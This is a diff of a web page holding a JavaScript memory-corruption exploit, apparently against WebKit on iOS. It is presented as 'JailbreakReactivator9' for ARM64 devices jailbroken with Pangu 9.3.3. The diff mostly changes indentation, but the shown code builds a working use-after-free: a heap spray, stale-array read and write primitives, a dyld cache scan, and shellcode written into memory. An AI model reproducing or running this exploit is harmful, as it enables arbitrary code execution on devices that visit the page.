@@ -1,5 +1,4 @@
-
- <html>
+<html>
  <head>
  <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
  <meta name="apple-mobile-web-app-capable" content="yes">
@@ -55,7 +54,7 @@
  
  for(var i = 0; i < filestream.length; )
  {
- var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
+ var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
  shll[i/4] = word;
  i+=4;
  }
@@ -65,35 +64,35 @@ var print = alert;
 _dview = null;
 
 function u2d(low, hi) {
-    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
-    _dview.setUint32(0, hi);
-    _dview.setUint32(4, low);
-    return _dview.getFloat64(0);
+    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+    _dview.setUint32(0, hi);
+    _dview.setUint32(4, low);
+    return _dview.getFloat64(0);
 }
 
 var pressure = new Array(400);
 var bufs = new Array(10000);
 
 dgc = function() {
-	for (var i = 0; i < pressure.length; i++) {
-		pressure[i] = new Uint32Array(0x40000);
-	}
+    for (var i = 0; i < pressure.length; i++) {
+        pressure[i] = new Uint32Array(0x40000);
+    }
 }
  
 
 function swag() {
-	if(bufs[0]) return;
+    if(bufs[0]) return;
 
-	dgc();
+    dgc();
 
-	for (i=0; i < bufs.length; i++) {
-		bufs[i] = new Uint32Array(0x100*2)
-		for (k=0; k < bufs[i].length; )
-		{
-			bufs[i][k++] = 0x41414141;
-			bufs[i][k++] = 0xffff0000;
-		}
-	}
+    for (i=0; i < bufs.length; i++) {
+        bufs[i] = new Uint32Array(0x100*2)
+        for (k=0; k < bufs[i].length; )
+        {
+            bufs[i][k++] = 0x41414141;
+            bufs[i][k++] = 0xffff0000;
+        }
+    }
 }
  
  var trycatch = "";
@@ -121,32 +120,32 @@ function smashed(stl) {
  var dyncachev = smsh[(jitf+0x20)/4];
  var go = 1;
  while(go) {
-    if(smsh[dyncache/4] == 0xfeedfacf)
-    {
-        for(i=0; i < 0x1000/4; i++) {
-            if( smsh[dyncache/4 + i] == 0xd &&
-                smsh[dyncache/4 + i + 1] == 0x40 &&
-                smsh[dyncache/4 + i + 2] == 0x18 &&
-                smsh[dyncache/4 + i + 11] == 0x61707369) // lulziest mach-o parser ever
-            {
-                go = 0;
-                break;
-            }
-        }
-    }
-    dyncache += 0x1000;
+    if(smsh[dyncache/4] == 0xfeedfacf)
+    {
+        for(i=0; i < 0x1000/4; i++) {
+            if( smsh[dyncache/4 + i] == 0xd &&
+                smsh[dyncache/4 + i + 1] == 0x40 &&
+                smsh[dyncache/4 + i + 2] == 0x18 &&
+                smsh[dyncache/4 + i + 11] == 0x61707369) // lulziest mach-o parser ever
+            {
+                go = 0;
+                break;
+            }
+        }
+    }
+    dyncache += 0x1000;
  }
  dyncache -= 0x1000;
  var bss = [];
  var bss_size = [];
 
  for(i=0; i < 0x1000/4; i++) {
-        if( smsh[dyncache/4 + i] == 0x73625f5f && smsh[dyncache/4 + i + 1] == 0x73) { // lolhax
+        if( smsh[dyncache/4 + i] == 0x73625f5f && smsh[dyncache/4 + i + 1] == 0x73) { // lolhax
  bss.push(smsh[dyncache/4 + i + (0x20/4)] + dyncachev-0x80000000);
  bss_size.push(smsh[dyncache/4 + i + (0x28/4)]);
 
  }
-    }
+    }
  
  
  
@@ -161,7 +160,7 @@ function smashed(stl) {
  
  for(var i = 0; i < filestream.length; )
  {
- var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
+ var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
  smsh[shc++] = word;
  i+=4;
  }
@@ -182,7 +181,7 @@ function smashed(stl) {
  for(var i = 0; i < bss.length; i++)
 {
  for(k=bss_size[i]/6; k < bss_size[i]/4; k++) {
-    write4(bss[i] + k*4,0);
+    write4(bss[i] + k*4,0);
  }
 }
  fc();
@@ -207,25 +206,25 @@ arr[1] = 0x13371337;
 
 var not_number = {};
 not_number.toString = function() {
-	arr = null;
-	props["stale"]["value"] = null;
-	swag();
-	return 10;
+    arr = null;
+    props["stale"]["value"] = null;
+    swag();
+    return 10;
 };
 
 var props = {
-	p0 : { value : 0 },
-	p1 : { value : 1 },
-	p2 : { value : 2 },
-	p3 : { value : 3 },
-	p4 : { value : 4 },
-	p5 : { value : 5 },
-	p6 : { value : 6 },
-	p7 : { value : 7 },
-	p8 : { value : 8 },
-	length : { value : not_number },
-	stale : { value : arr },
-	after : { value : 666 } 
+    p0 : { value : 0 },
+    p1 : { value : 1 },
+    p2 : { value : 2 },
+    p3 : { value : 3 },
+    p4 : { value : 4 },
+    p5 : { value : 5 },
+    p6 : { value : 6 },
+    p7 : { value : 7 },
+    p8 : { value : 8 },
+    length : { value : not_number },
+    stale : { value : arr },
+    after : { value : 666 } 
 };
 
 var target = [];
@@ -241,31 +240,31 @@ for(var z=0; z<0x1000; z++) fc();
 
 
 for (i=0; i < bufs.length; i++) {
-  for (k=0; k < bufs[0].length; k++){
-	if(bufs[i][k] == 0x41414242){
-	    stale[0] = fc;
-        fcp = bufs[i][k];
+  for (k=0; k < bufs[0].length; k++){
+    if(bufs[i][k] == 0x41414242){
+        stale[0] = fc;
+        fcp = bufs[i][k];
  
  
-        stale[0] = {'a':u2d(105, 0x1172600),'b':u2d(0,0),'c':smsh,'d':u2d(0x100,0)}
-	    stale[1] = stale[0]
+        stale[0] = {'a':u2d(105, 0x1172600),'b':u2d(0,0),'c':smsh,'d':u2d(0x100,0)}
+        stale[1] = stale[0]
 
-	    bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
-        bck = stale[0][4];
-        stale[0][4] = 0; // address, low 32 bits
-		// stale[0][5] = 1; // address, high 32 bits == 0x100000000
-		stale[0][6] = 0xffffffff;
+        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+        bck = stale[0][4];
+        stale[0][4] = 0; // address, low 32 bits
+        // stale[0][5] = 1; // address, high 32 bits == 0x100000000
+        stale[0][6] = 0xffffffff;
 
  mem0 = stale[0];
  mem1 = bck;
  mem2 = smsh;
-        bufs.push(stale)
-	    if (smsh.length != 0x10) {
-            smashed(stale[0]);
-	    }
+        bufs.push(stale)
+        if (smsh.length != 0x10) {
+            smashed(stale[0]);
+        }
 
  stale[0][4] = bck;
-        stale[0][6] = 0x10;
+        stale[0][6] = 0x10;
  
  bufs[i][k] -= 0x10; // FIXUP
  
@@ -280,9 +279,9 @@ for (i=0; i < bufs.length; i++) {
  bufs.push(stale);
  
  
-        return;
-	}
-   }
+        return;
+    }
+   }
  }
  document.location += '#';
  }
@@ -291,8 +290,10 @@ for (i=0; i < bufs.length; i++) {
  </script>
 
 
+Welcome to JailbreakReactivator9
+
+use this on any ARM64-bit device as long as it's jailbroken with Pangu9.3.3
 
 <center><a href="javascript:go()"><h1>enter jailbroken mode again</h1></a></center>
 </body>
 </html>
-
